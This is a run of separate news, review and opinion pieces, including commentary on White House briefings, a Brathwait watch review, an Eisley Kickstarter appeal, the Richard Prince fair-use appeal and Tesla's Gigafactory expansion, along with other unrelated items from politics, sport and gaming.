Breitbart — the hard-right website whose former chairman, Stephen K. Bannon, was named Mr. Trump's chief strategist — is already part of Mr. Trump's transition pool. The organization's presence has raised some eyebrows, particularly in liberal media circles, because of its connection to Mr. Bannon. But members of the pools said they did not see it as an issue and pointed out that other partisan news outlets, like the left-leaning Huffington Post, were part of the pool.
Some former press secretaries suggested that Mr. Trump's administration should rethink the tradition of broadcasting press briefings on live television, which many says has led to posturing and performance.
Mr. McCurry, who introduced the tradition, said the live format had turned the daily briefings “into an alternative to the daytime soap operas.”
“It was not a mistake to allow broadcast media to record the daily press briefing, but I should have put some restrictions and rules on it,” he said.
One idea, he said, would be to embargo the briefings until their conclusion so they might be more informative for reporters and less like a theatrical show.
Mr. Fleischer also recommended taking the briefings off live television. But given Mr. Trump's propensity for showmanship, the live broadcasts may be the tradition least likely to change.
“There's a piece of me that thinks what Trump wants to do more than anything else,” Mr. Fleischer said, “is make the briefing a red-hot TV show.”

When I first heard of the new affordable watch brand Brathwait, I immediately checked out their website. What I found really intrigued me. They have a complete breakdown of the pricing of their watch, showing how much the case, dial, strap, movement, crystal etc cost exactly. They give you the total price it cost to make it ($75), their price they're selling it at ($150), and what you'd expect to pay for a watch of the same standard on the high street. This is known as transparent marketing, and in the land of watches, it's something I've never seen before (everlane.com were apparently one of the first to do this, but don't sell timepieces). This impressed me so much I just had to get a Brathwait Classic Slim watch. Can a watch manufacturer really do this successfully? Read on to find out.
The case
Brathwait is named after Richard Brathwait, “the world's first acclaimed gentleman”. A British poet, he introduced the notion of the gentleman in 1631 when he published “the complete guide to the English gentleman”. If he was alive today, what watch would he wear? The watch manufacturer bearing his name would no doubt believe it would be theirs.
The Brathwait Classic Slim is without doubt a smart dress watch. Measuring in at 40mm in diameter, and a very thin 7.5mm tall, it is extremely easy to fit under the shirt cuff of gentlemen who love to wear a suit or jacket. Weighing in at a mere 37g without a strap fitted, and just 47g with the NATO strap, it is also extremely lightweight – resulting in an easy, comfortable and unobtrusive wear. With a lug width of a very popular 20mm, it's easy to switch the strap with an endless selection of others.
A classic dress watch aims to be subtle, elegant and simple. The Brathwait has achieved this.
The case itself is made of AISI (American Iron and Steel Institute) approved 316L stainless steel, costing $9.70 to make. It is covered by a flawless polished rose gold plating, which is extremely reflective. It looks like an excellent quality plating, and that's backed up by the thickness of it. It's 6uM thick, which is 6/1000 of a mm (yup, six thousandth of a millimetre). Apparently, this is very thick and should last many a year (around 12) without rubbing away, as 1uM is regarded to last 2 years.
So now we know the techno specs, what's the case like in the flesh? The finishing is so good, it's actually very hard to photograph due to the reflection being just like a mirror. All the machining is spot on, with no flaws or sharp edging apparent.
The Brathwait also boats a 1.9mm thick domed sapphire crystal, with a layer of anti-reflective coating on the underside, costing $14.50. Whilst the AR coating provides an appealing blue hue, it doesn't appear to be the most effective at reducing reflections. This adds to the nightmare of trying to photograph this watch, it's hard to get a decent face-on shot without seeing yourself in the reflection. Realistically, though, in everyday life it's not a big deal. Reading the time is still quick and easy thanks to the simple dial. I think it's great that Brathwait have made the point to include a sapphire crystal. It's the most pricey part of the watch, and eats the most into their profit, but you get the feeling that they don't care about that – they just want to create a simple, top-notch watch for as little as possible and pass that onto the purchaser, whilst being as transparent as possible. I love that.
The lugs are very shapely. Looking at the case side-on, you'll see that they are rather thin and reasonably long, with a gentle curve downwards. From above, they're a baton shape with slightly curved edges. They're well designed, and of course, excellently machined.
The push-pull crown is extremely small (as in, about 2mm in diameter), but not in a “looks stupid” kind of way, but rather in a unobtrusive and subtle way. It actually suits the watch well from a design perspective. It has a unsigned end, and a good level of grip, allowing you to easily use it despite its small size. I do like the underneath of the crown. Due to the rear of the case angling inwards toward the smaller caseback, the crown stem is housed by a rounded surround, a nice solution.
Moving on to the shape of the back of the case – it's much wider on the top side, so it's angled in toward the caseback. This gives the appearance of the case being thinner than it actually is, due to the fact that when you're wearing it normally, you can't really see the sides of the case. This is a good thing on a watch designed to be a gentleman's dress timepiece.
Just like the rest of the case, the caseback is polished, with a flawless finish, and is secured in place by 4 screws. Where these screws fit is all surprisingly tidy for a watch at this price.
The caseback also has some information deeply engraved on it. Nothing fancy, just “Brathwait” along the centre, and other watch specifics around the outer edge such as “Swiss movement” and “sapphire glass”. They've kept it plain and simple, like the whole watch, which is good.
All in all, whilst being uncomplicated (which is the point), the case of the Brathwait Classic Slim watch is machined and finished to an excellent standard despite the price of just $150.
The dial
Simplicity seems to be a running theme here. The dial is very minimal in its design. But, like the case, it is very well executed.
It's interesting to note that Brathwait apparently used the “golden ratio” in the design of the dial, which has been found in nature.
During the design process, this graphic was placed on the dial, and was used as a base to design the length and max width of the hands, the difference in length between the minute and hour markers, the total length of the hour markers, and the placement of the logo. An intuitive way of designing a watch.
It had a very light beige colouring, which provides a smart appearance and good legibility.
The next thing you notice is the applied hour markers. Thin and long, they look elegant, and don't detract from the simplicity of the watch. They are also surprisingly well made and applied for a watch at this price. They are all plain stick batons, with a polished finish as high quality as the case, and are aligned and applied perfectly.
Around the outer edge of the dial is a very minimal printed minute track, consisting of thin black dashes at every minute between the applied hour markers. The printing is clean and crisp, with no smudging apparent. Bar the logo, this is the only printing on the dial, keeping it super clear.
The logo is in the usual position centred in the top half of the dial. It is printed rather than any sort of applied logo, and also is quite a small font size. A rather plain sans-serif font has been used, making sure there's no unnecessary complication with the dial. Personally, I think I would have preferred it if they made a little bit more of an effort with the logo, as it does look slightly too plain, and I think something a little bit more interesting would have made the watch stand out more. Just like the minute track, the printing of the logo is precise.
The final aspect of the dial to discuss is the hands. The minute and hour hands are both the same polished gold plating as the case and applied hour markers. It's good to see continuity like that throughout the watch. They are a thin and elegant long triangle shape, with a smaller triangle on the back end as a counterweight. They also have a 3D appearance to them, being slightly raised in the middle, which creates a nice variety of shades of reflection of light based on the angle you are looking at the watch.
The second hand is a red lacquer finish, allowing it to stand out from the equally long hour hand. It is also thinner, being a thin stick rather than an arrow or triangle shape, and has a wider rectangular counterweight. When you have a dress watch with very thin hands it can be hard to differentiate between the minute and second hands. This was the case on our recent review of the Christopher Ward C9 Big Day Date. With the Brathwait Classic Slim watch, however, they have done a good job of creating a visual distinction between them, making reading the time at a quick glance easy.
The dial on the Brathwait is possibly one of the simplest I have reviewed yet. Not that that is a bad thing. It is still pleasing to the eye from a design perspective, and is made very well.
The movement
Powering the Brathwait is a Swiss Made quartz Ronda movement. A good choice, as you could easily slap in a cheapo Chinese or Japanese quartz movement that costs a fifth of the price ($2 vs the $10 Ronda) but that would cheapen the aura of the watch. Instead, the Brathwait houses a decent, rugged quartz movement which is unlikely to let you down and just keep going until the battery runs out. Although not specified, it's likely to be one of their standard 3-hand quartz movements, providing 4 years life span, and accuracy to -10/+20 seconds a month.
So although there's not a great deal to say about the movement itself, it says a lot about Brathwait and their desire to use good parts.

The straps
For the price of $150, you get the choice of one of three different coloured NATO straps: green, blue, or purple. If you want all three, you can buy the set for $26, and for an extra $25 you can choose a brown leather strap instead. I only had the NATO straps sent through, so unfortunately I can't comment on the leather strap. Although I feel that the watch would great on any decent quality brown leather strap. The lugs are a standard 20mm wide, so fitting a strap of your choice would not be a problem.
The NATO straps cost Brathwait $5.80. Considering you can buy a new one off eBay for around £6, these seem to be a high grade. The colours are all a luxurious shade, not cheap or tacky looking. The straps also have a thin red/orange strip running down the centre. This ties in nicely with the red second hand and matches and maintains the coloured aspect of the dial. Some NATO straps are very colourful and much more stripy, but I like the simplicity of these straps.
The quality of these NATO straps is apparent. The edging is tidy, the stitching thick and shows that it's well put together. They are also very soft and comfortable, and extremely light – the Brathwait is overall a very light watch, weighing in at 47g with the strap fitted as mentioned before, resulting in a very comfortable wear. You'd barely notice it on your wrist.
Each NATO strap also has the same polished rose gold hardware as the rest of the watch. By matching this all up, it creates a great overall impression and appearance of the watch. As you'll imagine, the finishing is very good, albeit prone to scratching due to the polished finish – although to be fair the buckles have held up very well so far, still looking as good as new. This is possibly due to the fact that the buckle doesn't sit directly on the centre of the underside of your wrist, thus avoiding desk swirlies.
One final thing to mention – If you've never really had much experience with NATO straps before, the great thing about them is how extremely easy they are to change. You can literally change one within 10 seconds. Check out the video review to see.
I think the decision to sell the Brathwait Classic Slim watch primarily on NATO straps is a good idea. So often with affordable watches they include a rubbish leather strap to keep costs down which is too poor to keep, so you end up changing it. With the NATOs though, you are getting a good quality strap for the price you are paying. If you want a leather strap, you can source one yourself, or pay an extra $25 for a fairly decent looking one. So you avoid the annoying rubbish leather strap situation completely. I also think it makes the Brathwait a little different too – this is quite an unusual mix of styles, as NATOs are regularly used for diving. But by coupling this with very elegant dress styling creates a unique appearance.
Final comments
The Brathwait Classic Slim is a lovely watch. The fit and finish is excellent for the price, and the rose gold plating is very impressive. The case shape is pleasing to the eye, and the thick sapphire crystal makes this a great buy at $150. It's designed and constructed well throughout, supporting their claim that the Classic Slim is equivalent to watches much more expensive. Let's hope there's an automatic version coming soon, as I have no doubt that it will become even more successful than I know this one will. A great buy for someone looking for a affordable elegant dress watch offering high build quality and a no-hassle movement. Isn't that us all?

A health minister is facing the humiliation of being ousted from a prestigious role within the Royal College of Physicians over claims that he falsely reassured doctors who feared the coalition would privatise of the NHS.
Earl Howe's position on an advisory committee is being reviewed following a complaint. Six influential members of the professional body that represents doctors wrote to its president, Sir Richard Thompson, claiming that the minister was "not a fit person to fulfil this important role". Thompson has launched an investigation by the College's trustees into Howe's probity.
The senior doctors claim that Howe, a former banker, falsely advised them that reforms under the health and social care bill would not force doctors to use market mechanisms to choose where patients will be treated.
According to the doctors, the regulations will mean that clinical commissioning groups – the bodies to be set up by GPs to organise patients' care – will have to put services out to tender if there is more than one provider capable of offering particular treatments. This means NHS hospitals and services will have to compete with private health firms for business.
Andy Burnham, the shadow health secretary, said there had been a breakdown in trust between health professionals and government, adding: "This whole issue has become a crisis of trust for the department of health. There would be a straight forward breach of trust given that statements ministers have given have not been honoured.
"The medical profession feels the government has mis-sold its NHS reforms. It was sold on the principle that doctors would be in control but in fact it will be the market that will decide."
A spokeswoman confirmed that Thompson, and "in the interest of probity", had "referred the issue to the board of trustees and would report back in June".
She said the Friends of the RCP, the committee on which Howe serves, is an informal advisory group, including past presidents and officers, and figures from finance, industry, and other charities, that plays no role in the governance or management of the RCP but offers advice in areas such as effective fundraising.
The coalition denies the regulations will force doctors to put services out to tender, believing it will give GPs the ability to select a variety of providers and will improve standards.
Sen. Ted Cruz is joining Tea Party activists in calling on Congress to abolish the Internal Revenue Service as the freshman lawmaker made the case from tax reform.
The Texas Republican on Monday said news that the IRS targeted the nonprofit applications of conservative-leaning political groups was an "inspiration" because of how it has sparked "normal American citizens that are standing up for liberty." In the wake of the IRS scandal, Tea Party groups have repeatedly called for the agency to close its doors, and Cruz, a hero of the conservative movement, echoed their sentiments.
"It is a challenge that we all face to limit the power of Washington," Cruz said. "After these revelations of political targeting by the IRS, we need to padlock and shut down the building, abolish the IRS, and move to a flat tax or the FAIR Tax."
Leaders in Congress have publicly expressed a willingness to tackle tax reform, though it seems that Democrats and Republicans every year express similar sentiments without any action. Earlier in the day, a new government study showed profitable corporations paid an effective income tax rate lower than 13 percent in 2010, sparking calls from both sides of the aisle to take another look at the tax code.
About
Those of you who have been following along already know that 2012 brought enormous change for us. There were so many ‘firsts' for us last year that we can hardly count them. On the music side, we self-recorded and produced the first Eisley record since the early EP's. We are so excited our new album, titled CURRENTS, will be released MAY 28TH, 2013! Pre-Order our new record here. One the personal side, four of Eisley's five members just had the blessing of welcoming beautiful children into the world.
Amidst these crazy-incredible changes in our lives, we also want you to know that our musical careers aren't slowing down one bit. We want to release our new record, do a ton of touring with some of our (and your) favorite bands, and bring our live show's to a new level while simultaneously bringing that show to new faces all over the world.
Eisley has dedicated the last 15 years (over half of most of our lives) to you, the fans – giving you 4 full-length albums, 10 EP's, and over 23 full-length tours covering a huge part of the world. Let us explain what we have planned for our future, and why we made this kickstarter.
We have ambitious plans for touring in 2013 and beyond. We expect this upcoming album to be our most successful record yet, and we want to be able to play in front of every single person that will to listen to us. This includes all of our fans in the U.S., as well satisfying relentless requests for us to play for our fans overseas. Specifically, we will be supporting Say Anything on their Rarities Tour this Summer (See dates). But, this is going to be more difficult than ever, since we not only have to support ourselves on these tours, but we have four beautiful new mouths to feed, safely transport, and care for. This means we no longer have the luxury of being able to suck it up, hop in a 15-passenger van and have a care-free, fun time with you all on the road. Our future, which we want to spend with you, requires the use of safer, but more expensive means of transportation.
Most of these costs fall directly on us, Eisley's band members. We adore spending time on the road with you guys, meeting our amazing fans, as well as spending years of our lives creating music for you. That's why we want your help to make sure that we can tour on this album as much, and to as many places as possible! This project will help fund all of our touring efforts for our upcoming album, until our next record is released.

MORE ABOUT THE ART GUITAR
So, this art guitar - we think - is positively awesome. Larose Guitars has been making amazing handmade and custom instruments for decades now. Eisley has played Larose guitars almost exclusively for years now, so we can personally attest to the amazing skill and craftsmanship that goes into making these instruments. Each of these guitars will have unique hand-drawn artwork by Eisley's members Sherri Bemis, Chauntelle D'Agostino, and Stacy King covering practically the entire guitar. All of the guitars will be hand signed by the entire band, and the art + signatures will be sealed under a finish that preserves the art. These guitars are beautiful, but make no mistake that they are built to be PLAYED. As such, they should play exceptionally well, and sound just as good as they look. These are worth every penny, in our opinions, and will likely only grow in value. We're only making 10 of these babies.
The particular model we are offering is the LaRose "Classic Jazz" model. This guitar is based from the guitar that Sherri Bemis has played live for many years (you can sneak a few shots of it in our video above). All of the artwork will be unique to each guitar, so no two guitars will be exactly alike. Here are some technical specs on the guitar:
Body: Alder or Ash
Neck: Maple
Fret Board: Madagascar Rosewood
Dot Inlays
Pickups: Lollar Jazzmasters
Make sure to Check out the LaRose Guitars website for the other awesome stuff he offers.
There you have it. We can't wait to get back on the road and see every one of your faces on tour. We thank you in advance for all of the loving support that you guys give, as well as your contributions.
Love,
Sherri Bemis

Wind, rain boosts renewable energy output
Some 70% of Portugal's electricity needs came from renewable sources in the first quarter of the year thanks to good weather conditions for wind and hydroelectric production, power distribution utility REN said.
‘Good' in this contexts means wet, windy days.
Hydro power production was more than three fold up on 2012 and supplied 37% of consumption, while wind farm output was 60% higher than the first quarter of last year, supplying 27% of consumption.
These are the two most important forms of renewable energy in the country and together they doubled output between 2012 and 2013. Wind farms generated more than ever, 36% above their average output.
On the other hand, electricity consumption dropped 2.3%, though most of this was due to higher average temperatures and the number of working days.
Consumption has been falling since 2010 and is now back at 2006 levels.
Coal and gas power station power generation fell 29% and 44% between January and March compared with the same period in 2012.
The first three months of 2013 saw Portugal exporting the equivalent of 6% of domestic consumption.
NGO housing them evicted from building.A non-profit organisation which has been working with teenaged daughters of commercial sex workers has been asked to vacate the suburban Mumbai flat out of which it operates after residents of the building came to know about the parentage of the girls.Eleven revolutionaries, as the NGO Kranti prefers to call its wards, face the threat of homelessness after June 10, the date by which the NGO must vacate its Kandivali east apartment. The NGO provides the girls – aged between 13 and 19 --education, leadership training and therapy, as well as imparts them the skills necessary to work within their community in the red light areas.Everything was working smoothly until, ironically, fame did the NGO in. Some time last year, one of the girls, 18-year-old Shweta Katti was selected by New York's Bard College and offered a $30,000 scholarship for her tuition fees. She was also listed by Newsweek as “one of the 25 under-25 women in the world to watch out for”.“All this while we had maintained that the girls were orphans. But once news of Katti broke, it became evident to the residents that they were children of commercial sex workers. They started complaining about us to the landlord, who withstood the pressure for a very long time,” said Robin Chaurasiya, co-founder of Kranti. She explained that the flat owner, M S Pavekar was kind enough to let them stay till the rent contract came to an end.Recently, the housing society called for a meeting and passed a resolution to evict the girls who stay with three caretakers in the 3-BHK flat in Akurli Om building. The landlord was left with no option but to ask them to vacate the flat.Over the last month-and-a-half, Kranti's team has been unable to rent a flat in the city, although it has seen over 100 properties, as this time it is being upfront with the owners about the identity of the girls. “Most praise us for the work but do not want to give their houses on rent,” said Chaurasiya, an Indian-American.The NGO cannot afford to buy a flat in the city. Nor does it make sense for it to operate from outside Mumbai because its objective is to train girls to do social work in the city's red light areas, and create a support system there.Residents of the society insisted theirs was a building for “families” and that the girls might be a bad influence on their children.
Manchester City defender Eliaquim Mangala believes Raheem Sterling is destined to become a key player at the Etihad Stadium and will only get better in the years to come.
The England international has developed into an important part of the first team at City since joining the club from Liverpool ahead of the 2015-16 campaign and has already netted eight goals from 22 appearances in all competitions.
Sterling scored twice and set up another in the 4-2 Champions League win over Borussia Monchengladbach on Tuesday and Mangala is confident there is still more to come from the 21-year-old.
"He did really well for us on Tuesday and he's shown he can score important goals for us," Mangala told the official City website.
"He's a great talent and he wants to learn and keep improving and I'm certain he will."
Manuel Pellegrini's men clinched top spot in Group D following the results on Tuesday, but Mangala is not getting carried away just yet.
"It's good to finish top of the group, but we'll wait and see what happens in next week's draw," he added.
"You need to improve in this competition and you have to work to do that, but we feel we are learning all the time."
Thomas Perkins is a hyper-wealthy venture capitalist. Beyond his enormous success in business, he may be best known as the man who was profiled by "60 Minutes" for owning The Maltese Falcon, one of the largest privately owned sailing yachts in the world (he's since sold it). He's the former husband of Danielle Steel, one of the most successful authors ever, and he owns many mansions all over the world. All in all, it's pretty good to be Tom Perkins.
Or so you would think! Yet according to a letter to the editor he wrote to the Wall Street Journal, the reality of being Tom Perkins isn't so much defined by extravagant wealth, luxury, comfort, and power, but rather a growing sense of fear and dread. It's so bad, Perkins says, that being a member of the American 1% today is actually comparable to being a Jew in Nazi Germany.

Seriously. He wrote this.
Here's Perkins' letter, in full:
Writing from the epicenter of progressive thought, San Francisco, I would call attention to the parallels of fascist Nazi Germany to its war on its "one percent," namely its Jews, to the progressive war on the American one percent, namely the "rich." From the Occupy movement to the demonization of the rich embedded in virtually every word of our local newspaper, the San Francisco Chronicle, I perceive a rising tide of hatred of the successful one percent. There is outraged public reaction to the Google buses carrying technology workers from the city to the peninsula high-tech companies which employ them. We have outrage over the rising real-estate prices which these "techno geeks" can pay. We have, for example, libelous and cruel attacks in the Chronicle on our number-one celebrity, the author Danielle Steel, alleging that she is a "snob" despite the millions she has spent on our city's homeless and mentally ill over the past decades. This is a very dangerous drift in our American thinking. Kristallnacht was unthinkable in 1930; is its descendent "progressive" radicalism unthinkable now?
For those who don't already know: Kristallnacht was a giant anti-Semitic riot, organized by the Nazi government, that left nearly 100 Jews in Germany and Austria murdered and resulted in the incarceration of some tens of thousands more in concentration camps. It was an act of coordinated barbarism done in service of the Nazis' ultimate goal, the expulsion (and, later, elimination) of Europe's Jewish population.
American progressives, on the other hand, would like to see Tom Perkins pay more in taxes.
WRONG QUESTION, RIGHT ANSWER…. President Obama sat down with ABC News' George Stephanopoulos for an exclusive interview in Prague yesterday, on the heels of the president signing in a new arms treaty with Russia. The interview, portions of which were aired this morning on “Good Morning America,” covered quite a bit of ground, and the transcript is well worth reading for thoughts on Iran, among other things.
There was, however, one exchange that stood out for me.
STEPHANOPOULOS:I want to get to some of those broader issues [of nuclear proliferation]. Because you're also facing criticism on that. Sarah Palin, taking aim at your decision to restrict the use of nuclear weapons. Your pledge not to strike nations, non-nuclear nations, who abide by the nonproliferation treaty. Here's what she said. She said, “It's unbelievable, no other administration would do it.” And then she likened it to kids on the playground. She said you're like a kid who says, “Punch me in the face, and I'm not going to retaliate.” Your response? OBAMA: I really have no response. Because last I checked, Sarah Palin's not much of an expert on nuclear issues. STEPHANOPOULOS: But the string of criticism has been out there among other Republicans as well. They think you're restricting use of nuclear weapons too much. OBAMA: And what I would say to them is that if the secretary of defense and the chairman of the Joints Chiefs of Staff are comfortable with it, I'm probably going to take my advice from them and not from Sarah Palin. STEPHANOPOULOS: But not concerned about her criticisms? OBAMA: No.
The president's response was the right one. When dealing with issues of counter-proliferation and the nuclear threats of the 21st century, he can listen to credible and knowledgeable experts, including his secretary of defense and the chairman of the Joints Chiefs of Staff, or he can listen to the bizarre rhetoric of a dimwitted former half-term governor of a small state, who appears to have no working knowledge of this or any other subject. It's not a tough call. Why on earth would anyone give a damn what the clownish Sarah Palin thinks about arms control?
Which leads to the larger point: why is George Stephanopoulos using an idiotic quote from a dimwitted former half-term governor of a small state as the basis for a question to the president?
In effect, the “GMA” host was saying, “Some conspicuously unintelligent right-wing media personality said something stupid about a subject she knows nothing about. Mr. President, how do you respond?”
Here's a thought: why should he be expected to respond? When doing an interview after a key development on international affairs, why not stick to the perspectives of grown-ups?
Update: Stephanopoulos responds to my concerns (and I respond to his response).

The BBC understands Sir Jeremy Heywood has said any ban lasting longer than six months could be discriminatory and may be cut to a "few weeks or months".
David Cameron is expected to set out his goals in more detail next week.
They are still expected to include the four year ban on tax credit claims.
But BBC's Newsnight understands legal advice from the European Commission is thought to have recommended this would amount to discrimination of non-British migrants and be illegal.
Mindful of the advice from European officials, the Cabinet Secretary has told ministers to revise down expectations of what can be achieved from EU renegotiations in relation to limiting access to tax credits.
Sir Jeremy is understood to believe the government has three options.
Firstly it could attempt to get treaty change on the matter, something he believes to be unlikely
Secondly, the government could ensure any policy affecting EU migrants would also affect British citizens to avoid accusations of discrimination
It could limit tax credits but only for a few weeks or months, not years, an option seen as being more likely
Action on migrants benefits is the most important of the policies the prime minister will next week put to Donald Tusk, president of the European Council, in a long-awaited letter.
Last November David Cameron made stopping working migrants from receiving benefits before they had been resident in the UK for four years a red line for Britain staying in the EU.
In summary: EU negotiations

David Cameron says he has a mandate to pursue EU reform following the Conservatives' general election victory.
The PM wants to renegotiate the terms of the UK's membership ahead of a referendum by the end of 2017. He has said he will campaign for Britain to remain in the EU if he gets the reforms he wants.
What Britain wants from Europe
EU vote: When, what and why?
Osborne: UK can get 'best of both worlds'
At the time, he said: "I will insist that in the future those who want to claim tax credits and child benefit must live here and contribute to our country for a minimum of four years.
"If I succeed, I will... campaign to keep this country in a reformed EU. If our concerns fall on deaf ears… then of course I rule nothing out."
It is known that officials in the European Commission in Brussels have cautioned against the British government expecting to win the four year ban on tax credits for EU migrants to Britain.
In recent months, David Cameron has come under pressure to reveal his requests after other European countries complained they did not know what measures the prime minister wanted changing.
He will now set out his initial demands in a letter next week ahead of the summit of European leaders in December.
German pressure
Charles Grant, director of the Centre for European Reform, told BBC Newsnight that restrictions on access to benefits was Downing Street's "most important" demand.
"They made that demand as they see it as a more moderate request than their initial idea to have quotas on numerical limits on EU migrants coming into the UK," he said.
"Under pressure from Angela Merkel, the PM backed down on that, and came up with this four year demand instead.
"The trouble is it's illegal because it would discriminate against EU citizens on the basis of their nationality.
"The legal experts say that if you go for, say, a one or two-year residency qualification it's not much better than four years - it still could be seen as discriminatory. However, when you go down to months rather than years it would be much easier to get away with, and I don't think the British would have too much of a problem getting away with that rule".
But Raoul Ruparel, from the think tank Open Europe - which campaigns for EU reform, told Newsnight: "If David Cameron comes back with a ban of less than year or two he's going to have a very hard time selling that to the British public, and it may even lead to people voting out."
A spokesman for the Cabinet Office declined to comment.

Motorists trapped in lengthy tailbacks jumped out their cars and began playing football on the parallel carriageway while police dealt with a serious incident further up the road.
Others laid out flat on the tarmac to sunbathe in the sweltering July heat in the bizarre scenes on the M20 this afternoon.
Huge queues formed after police shut both carriageways between junctions seven and eight, near Maidstone in Kent.
Bewildered motorists used Twitter to share comments, pictures and video of people trying to take advantage of absent traffic.
A spokeswoman for Kent Police said: "Kent Police was called at 5.52pm on Sunday July 17 to reports of concern for the welfare of a man on a bridge near Hockers Lane.
"Officers attended and as a precaution both carriageways on the M20 between J7 and J8, as well as Hockers Lane were closed.
"The man was detained by officers and given to health professionals. The roads have now been re-opened."
Chicago Sky forward Elena Delle Donne has been named the 2015 WNBA Most Valuable Player, the WNBA announced on Wednesday.
Delle Donne played in 31 of 34 regular-season games in 2015, leading Chicago in points (23.4 ppg), rebounds (8.4 rpg) and blocks (2.0 bpg). She set a league record for free-throw accuracy: her 95 percent from the line is the best mark for any player with at least 200 attempts. Even more remarkably, Delle Donne posted a PER of 32.7, becoming just the second player since 2000 to reach a PER of at least 32 in a season.
In June, Delle Donne dropped 40 points twice, including a career-high 45 in an overtime win against Atlanta:
This is the 26-year-old's first WNBA MVP, the first of perhaps many.

Appeal Finds Fair Use In Richard Prince's “Canal Zone” Series
Postmodernism is having the best day ever. It's been just over a year since a New York District court dealt a major blow to Richard Prince, finding his Canal Zone series guilty of violating the copyright in Panamanian landscape photographs and Rastafarian portraits by Patrick Cariou. Not only was Prince found guilty, but the court ordered all unsold Canal Zone artworks and catalogs sent to Cariou so that they could be destroyed, sold, or disposed of as he saw fit. Thankfully, today sees a win for art: the case's defendants won an appeal with the United States Court of Appeals for the Second Circuit.
Gagosian and Prince appealed that decision on the grounds that Prince makes fair use of Cariou's photographs, often altering them very slightly with painting and collage. The Supreme Court only defines fair use as needing to “alter the original with ‘new expression, meaning, or message.'” The lower courts interpreted this to mean that, in order to make fair use of Cariou's photographs, Prince must “comment on Cariou, on Cariou's Photos, or on aspects of popular culture closely associated with Cariou or the Photos.” (Satire, for example, would be fair, as in the ruling's mention of 2 Live Crew's parody of Roy Orbison's “Oh, Pretty Woman”). The higher courts disputed that definition: “We agree with Appellants that the law does not require that a secondary use comment on the original artist or work, or popular culture…” In other words, the appellate court has allowed Prince to use the images for personal expression.
This was, and still is, a big deal: if the first ruling were applied across the board, anyone who's ever copied, altered, collaged, or generally riffed on virtually anything could be in huge legal trouble. For the lower court, Prince didn't transform Cariou's originals enough; the alterations (like pasting Baldessari-esque dots to faces or collaging nude bathers in a manner akin to Picasso's Demoiselles d'Avignon) were minimal. The ruling is full of considerations as to what this would mean if artists were no longer allowed to reinterpret other people's images. Just for an idea of what that would look like, the court mentions that even Andy Warhol potentially wouldn't have been safe from the ruling:
Much of Andy Warhol's work, including work incorporating appropriated images of Campbell's soup cans or of Marilyn Monroe, comments on consumer culture and explores the relationship between celebrity culture and advertising.
Still, the appeal leaves it to the lower court to decide just how much an artist needs to affect an image in order to change it. There are still five photographs the court has refused to judge (Graduation, Meditation, Canal Zone (2007), Canal Zone (2008), and Charlie Company)–because their alterations are so small. They write of those images:
While the lozenges [in Graduation], repetition of the images, and addition of the nude female unarguably change the tenor of the piece, it is unclear whether these alterations amount to a sufficient transformation of the original work of art such that the new work is transformative.
And, when it comes down to it, that's a question of whether, and for whom, these are effective works of art.
Earlier this year, Tesla reached over $1 billion in construction spending on the Gigafactory in Nevada, according to building permits. Despite the large investment, the current structure, which hasn't changed much so far this year, only represent a fraction of the planned final building.
We now learn that they are working on adding another expansion to the building with a new section.
Over the past 3 months, Tesla obtained new building permits to build additional foundations and structure for a new section called “Section G”.
The current structure has a 1.9 million square-foot footprint and about 4.9 million square feet of operational space. It represents only ~30 percent of the total finished Gigafactory.
While construction work has been ongoing in the interior, the exterior structure stayed the same since late last year and only finishing work has been visible since the beginning of the year.
Above, you can see a satellite picture taken last week and below is a side-by-side comparison from January to March:
A new section would be the most significant addition to the site in 2017.
Building permits listed on Buildzoom showed Tesla obtained one for “structural steel and foundations” estimated at $13 million and later obtained an addendum for an estimated $28 million project on the new section:
The new section appears to be coming up on the north side of the factory.
Here's a side-by-side comparison from satellite pictures of the factory from 2 weeks ago (left) and last week (right) – via planetlab:
Tesla also obtained dozens of new construction permits for the Gigafactory over the past few months, including for an AT&T cell tower estimated at $350,000 and two skids mounted hot oil heating systems estimated at $18.7 million.
While construction is ongoing, Tesla, Panasonic, and other suppliers, are also now actively manufacturing batteries and battery packs at the factory.
Panasonic has been ramping up battery cell production for the current onsite manufacturing of Tesla Powerwalls and Powerpacks, and at some point during the current quarter, battery cell production is expected to start being used for the Model 3, which in turn is expected to start production in July.
Tesla is also building Model 3 drive unit production lines at the Gigafactory – meaning that Tesla will ship most of the powertrain from the Gigafactory to Tesla Fremont Factory in California for the start of production.
From there, they plan to ramp up production to 35 GWh of battery cells and 50 GWh of battery packs in order to support Tesla's planned annual production rate of 500,000 vehicles in 2018. Ultimately, Tesla wants to reach full production of 150 GWh of battery packs output, which is expected in 2020 according to the company.
As they try to reach those goals, the company will also have several more parallel Gigafactory programs – up to 4 more factories, said CEO Elon Musk last week.

Borderlands 2 will boast two tiers of premium editions, developer Gearbox Software revealed during a presentation at PAX East this weekend. As reported by Kotaku, the $100 Deluxe Vault Hunters Edition will include a Marcus Kincaid bobblehead, and the Ultimate Loot Chest Edition will come with unnamed goodies. Borderlands 2 will have two special editions, but they remain largely mysterious.
A price for the Ultimate Loot Chest Edition was not announced. The full list of premiums for both versions will be announced at a later date, Gearbox said.
On top of revealing the premium editions of Borderlands 2, Gearbox announced the game's first downloadable content. The "mechromancer" class will be free for all who preorder the game and will be available for everyone at the same time (preorder or not) when the content arrives sometime after launch. A price for the DLC was not provided.
Borderlands 2 is the sequel to 2009's lauded original stylized shooter. It is due out for the PC, Xbox 360, and PlayStation 3 on September 18 in North America, with an international release following on September 21.
So Rep. Nancy Pelosi (D-Calif.) is "ecstatic" over today's Supreme Court ruling that the Affordable Care Act, a.k.a. Obamacare, has passed constitutional muster. As are many others.
But the youngsters out there, especially those who bought into President Obama's message of hope and change, should make sure they understand how his signature achievement is going to screw them even more royally than Medicare already does. Avik Roy at Forbes lays it out thus:
Obamacare forces insurers to charge their eldest beneficiaries no more than 3 times what they charge their youngest ones: a policy known as “community rating.” This, despite the fact that these older beneficiaries typically have six times the health expenditures that younger people face. The net effect of this “community rating” provision is the redistribution of insurance costs from the old to the young.
That's for premiums in the much-discussed and yet-to-be realized government exchanges for health care. The same principle is already at work to various degrees in community rating pools for workplace-provided insurance.
In the August/September issue of Reason (on newsstands now but not yet online), I've co-authored a piece about "Generational Warfare" with Veronique de Rugy in which we document the ways in which the old-age entitlements of Social Security and Medicare systematically loot the relatively young and relatively poor to pay benefits to the relatively old and relatively rich. Obamacare is simply the latest variation on that awful dynamic.

The Breakfast Program
